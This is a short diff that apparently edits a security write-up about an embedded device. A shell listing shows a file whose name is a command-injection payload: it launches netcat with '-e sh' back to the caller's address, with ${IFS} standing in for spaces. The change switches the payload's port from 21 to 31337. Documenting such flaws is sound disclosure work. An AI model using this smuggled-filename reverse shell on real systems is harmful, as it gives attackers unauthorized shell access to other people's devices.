@@ -120,7 +120,7 @@ nobody
 ls -l /mnt/usb2/
 total 4
 drwxrwxrwx    2 nobody   nobody           0 Dec 16 02:55 dvr
--rw-------    1 nobody   nobody           7 Dec 16 02:55 ||nc${IFS}${REMOTE_ADDR}${IFS}21${IFS}-e${IFS}sh${IFS}&${IFS}||
+-rw-------    1 nobody   nobody           7 Dec 16 02:55 ||nc${IFS}${REMOTE_ADDR}${IFS}31337${IFS}-e${IFS}sh${IFS}&${IFS}||
 exit
 $
 
